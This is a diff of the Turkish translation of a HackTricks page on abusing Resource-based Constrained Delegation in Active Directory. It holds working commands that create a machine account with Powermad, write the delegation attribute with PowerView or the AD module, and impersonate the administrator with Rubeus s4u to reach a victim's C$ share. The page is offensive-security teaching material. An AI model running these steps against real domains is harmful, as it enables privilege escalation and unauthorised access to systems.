@@ -1,22 +1,21 @@
-# Kaynağa Dayalı Kısıtlı Delegasyon
+# Resource-based Constrained Delegation
 
 {{#include ../../banners/hacktricks-training.md}}
 
+## Resource-based Constrained Delegation Temelleri
 
-## Kaynağa Dayalı Kısıtlı Delegasyonun Temelleri
-
-Bu, temel [Kısıtlı Delegasyon](constrained-delegation.md) ile benzerdir ancak **bir nesneye** **bir hizmete karşı herhangi bir kullanıcıyı taklit etme** izni vermek yerine, Kaynağa Dayalı Kısıtlı Delegasyon **nesne üzerinde herhangi bir kullanıcıyı taklit etme yetkisini belirler**.
+Bu, temel [Constrained Delegation](constrained-delegation.md) ile benzerlik gösterir, ancak **bir nesneye** **bir makineye karşı herhangi bir kullanıcıyı taklit etme** izni vermek yerine, Resource-based Constrained Delegation **nesne üzerinde herhangi bir kullanıcıyı taklit etme yetkisini belirler**.
 
 Bu durumda, kısıtlı nesne, herhangi bir kullanıcıyı taklit edebilecek kullanıcının adını içeren _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ adlı bir niteliğe sahip olacaktır.
 
-Bu Kısıtlı Delegasyonun diğer delegasyonlardan önemli bir farkı, **makine hesabı üzerinde yazma izinlerine sahip** herhangi bir kullanıcının (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ değerini ayarlayabilmesidir (Diğer Delegasyon türlerinde alan adı yöneticisi ayrıcalıkları gerekiyordu).
+Bu Kısıtlı Delegasyonun diğer delegasyonlardan önemli bir farkı, **makine hesabı üzerinde yazma izinlerine sahip** herhangi bir kullanıcının (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) **_msDS-AllowedToActOnBehalfOfOtherIdentity_** değerini ayarlayabilmesidir (Diğer Delegasyon türlerinde alan yöneticisi ayrıcalıkları gerekiyordu).
 
 ### Yeni Kavramlar
 
-Kısıtlı Delegasyonda, kullanıcının _userAccountControl_ değerinde **`TrustedToAuthForDelegation`** bayrağının **S4U2Self** gerçekleştirmek için gerekli olduğu belirtilmişti. Ancak bu tamamen doğru değildir.\
-Gerçek şu ki, o değer olmadan bile, eğer bir **hizmet** (bir SPN'e sahipseniz) iseniz, herhangi bir kullanıcıya karşı **S4U2Self** gerçekleştirebilirsiniz, ancak eğer **`TrustedToAuthForDelegation`** varsa, dönen TGS **İleri Yönlendirilebilir** olacak ve eğer o bayrağa sahip değilseniz, dönen TGS **İleri Yönlendirilemez** olacaktır.
+Kısıtlı Delegasyon'da, kullanıcının _userAccountControl_ değerindeki **`TrustedToAuthForDelegation`** bayrağının **S4U2Self** gerçekleştirmek için gerekli olduğu belirtilmişti. Ancak bu tamamen doğru değil.\
+Gerçek şu ki, o değer olmadan bile, eğer bir **hizmet** (bir SPN'e sahipseniz) iseniz, herhangi bir kullanıcıya karşı **S4U2Self** gerçekleştirebilirsiniz, ancak eğer **`TrustedToAuthForDelegation`** bayrağına sahipseniz, dönen TGS **Forwardable** olacaktır ve eğer o bayrağa sahip değilseniz, dönen TGS **Forwardable** **olmayacaktır**.
 
-Ancak, **S4U2Proxy**'de kullanılan **TGS** **İleri Yönlendirilebilir DEĞİLSE**, temel bir **Kısıtlı Delegasyonu** kötüye kullanmaya çalışmak **çalışmayacaktır**. Ancak bir **Kaynağa Dayalı kısıtlı delegasyonu** istismar etmeye çalışıyorsanız, bu **çalışacaktır** (bu bir güvenlik açığı değil, görünüşe göre bir özelliktir).
+Ancak, **S4U2Proxy**'de kullanılan **TGS** **Forwardable DEĞİLSE**, temel bir **Kısıtlı Delegasyon** istismar etmeye çalışmak **çalışmayacaktır**. Ancak bir **Resource-Based kısıtlı delegasyonu** istismar etmeye çalışıyorsanız, bu **çalışacaktır**.
 
 ### Saldırı Yapısı
 
@@ -24,24 +23,24 @@ Ancak, **S4U2Proxy**'de kullanılan **TGS** **İleri Yönlendirilebilir DEĞİLS
 
 Saldırganın zaten **kurban bilgisayarı üzerinde yazma eşdeğer ayrıcalıklarına** sahip olduğunu varsayalım.
 
-1. Saldırgan, bir **SPN**'ye sahip bir hesabı **ele geçirir** veya **oluşturur** (“Hizmet A”). Herhangi bir _Yönetici Kullanıcı_ özel bir ayrıcalığa sahip olmadan **10'a kadar Bilgisayar nesnesi oluşturabilir** (**_MachineAccountQuota_** olarak) ve bunlara bir **SPN** ayarlayabilir. Bu nedenle, saldırgan sadece bir Bilgisayar nesnesi oluşturup bir SPN ayarlayabilir.
-2. Saldırgan, kurban bilgisayar (ServiceB) üzerindeki **yazma ayrıcalığını** kötüye kullanarak **Kaynağa Dayalı kısıtlı delegasyonu, ServiceA'nın o kurban bilgisayar (ServiceB) üzerinde herhangi bir kullanıcıyı taklit etmesine izin verecek şekilde yapılandırır**.
-3. Saldırgan, **Service B**'ye **ayrılmış erişime** sahip bir kullanıcı için **tam bir S4U saldırısı** (S4U2Self ve S4U2Proxy) gerçekleştirmek üzere Rubeus'u kullanır.
-1. S4U2Self (ele geçirilen/oluşturulan SPN'den): **Yönetici için bana bir TGS iste** (İleri Yönlendirilemez).
-2. S4U2Proxy: Önceki adımda **İleri Yönlendirilemez TGS**'yi kullanarak **kurban ana bilgisayara** **Yönetici**'den bir **TGS** istemek.
-3. İleri Yönlendirilemez bir TGS kullanıyor olsanız bile, Kaynağa Dayalı kısıtlı delegasyonu istismar ettiğiniz için bu **çalışacaktır**.
-4. Saldırgan, **bilet geçişi** yapabilir ve kullanıcıyı **kurban ServiceB'ye erişim sağlamak için taklit edebilir**.
+1. Saldırgan, bir **SPN**'ye sahip bir hesabı **ele geçirir** veya **oluşturur** (“Hizmet A”). Herhangi bir _Admin User_'ın başka bir özel ayrıcalığı olmadan **10 Bilgisayar nesnesi** (_MachineAccountQuota_) oluşturabileceğini ve bunlara bir **SPN** ayarlayabileceğini unutmayın. Bu nedenle, saldırgan sadece bir Bilgisayar nesnesi oluşturup bir SPN ayarlayabilir.
+2. Saldırgan, kurban bilgisayar (ServiceB) üzerindeki **yazma ayrıcalığını** kullanarak **HizmetA'nın o kurban bilgisayar (ServiceB) üzerinde herhangi bir kullanıcıyı taklit etmesine izin verecek şekilde kaynak tabanlı kısıtlı delegasyonu yapılandırır**.
+3. Saldırgan, **Service B'ye ayrıcalıklı erişimi olan bir kullanıcı** için Service A'dan Service B'ye **tam bir S4U saldırısı** gerçekleştirmek üzere Rubeus'u kullanır.
+   1. S4U2Self (ele geçirilen/oluşturulan SPN'den): **Yönetici için bana bir TGS iste** (Forwardable DEĞİL).
+   2. S4U2Proxy: Önceki adımda elde edilen **Forwardable DEĞİL TGS**'yi kullanarak **Yönetici**'den **kurban ana bilgisayara** bir **TGS** istemek.
+   3. Forwardable DEĞİL bir TGS kullanıyor olsanız bile, Resource-based kısıtlı delegasyonu istismar ettiğiniz için bu **çalışacaktır**.
+   4. Saldırgan, **ticket'ı geçirebilir** ve **kullanıcıyı taklit ederek kurban ServiceB'ye erişim elde edebilir**.
 
-Alan adının _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
-```powershell
+Alanınızdaki _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
+```bash
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
 ## Saldırı
 
 ### Bir Bilgisayar Nesnesi Oluşturma
 
-Bir bilgisayar nesnesi oluşturmak için [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
-```powershell
+**[powermad](https://github.com/Kevin-Robertson/Powermad)** kullanarak alan içinde bir bilgisayar nesnesi oluşturabilirsiniz:
+```bash
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 
@@ -51,12 +50,12 @@ Get-DomainComputer SERVICEA
 ### Kaynak Tabanlı Kısıtlı Delegasyonu Yapılandırma
 
 **activedirectory PowerShell modülünü kullanarak**
-```powershell
+```bash
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
 **Powerview Kullanımı**
-```powershell
+```bash
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
@@ -81,7 +80,7 @@ Bu, o hesap için RC4 ve AES hash'lerini yazdıracaktır.\
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-Rubeus'un `/altservice` parametresini kullanarak sadece bir kez istekte bulunarak daha fazla bilet oluşturabilirsiniz:
+Rubeus'un `/altservice` parametresini kullanarak sadece bir kez sorarak daha fazla hizmet için daha fazla bilet oluşturabilirsiniz:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
@@ -90,8 +89,8 @@ rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:admin
 
 ### Erişim
 
-Son komut satırı, **tam S4U saldırısını gerçekleştirecek ve TGS'yi** Yönetici'den kurban makinesine **belleğe** enjekte edecektir.\
-Bu örnekte, Yönetici'den **CIFS** hizmeti için bir TGS talep edilmiştir, böylece **C$**'ye erişebileceksiniz:
+Son komut satırı, **tam S4U saldırısını gerçekleştirecek ve TGS'yi** Administrator'dan kurban hostuna **bellekte** enjekte edecektir.\
+Bu örnekte, Administrator'dan **CIFS** servisi için bir TGS talep edilmiştir, böylece **C$**'ye erişebileceksiniz:
 ```bash
 ls \\victim.domain.local\C$
 ```
@@ -107,7 +106,7 @@ ls \\victim.domain.local\C$
 - **`KDC_ERR_BADOPTION`**: Bu, şunları ifade edebilir:
   - Taklit etmeye çalıştığınız kullanıcı, istenen hizmete erişemiyor (çünkü onu taklit edemezsiniz veya yeterli ayrıcalıklara sahip değildir)
   - İstenen hizmet mevcut değil (eğer winrm için bir bilet isterseniz ama winrm çalışmıyorsa)
-  - Oluşturulan fakecomputer, savunmasız sunucu üzerindeki ayrıcalıklarını kaybetmiştir ve bunları geri vermeniz gerekir.
+  - Oluşturulan fakecomputer, savunmasız sunucu üzerindeki ayrıcalıklarını kaybetti ve bunları geri vermeniz gerekiyor.
 
 ## Referanslar
 
@@ -115,6 +114,7 @@ ls \\victim.domain.local\C$
 - [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
 - [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
+- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
 
 
 {{#include ../../banners/hacktricks-training.md}}
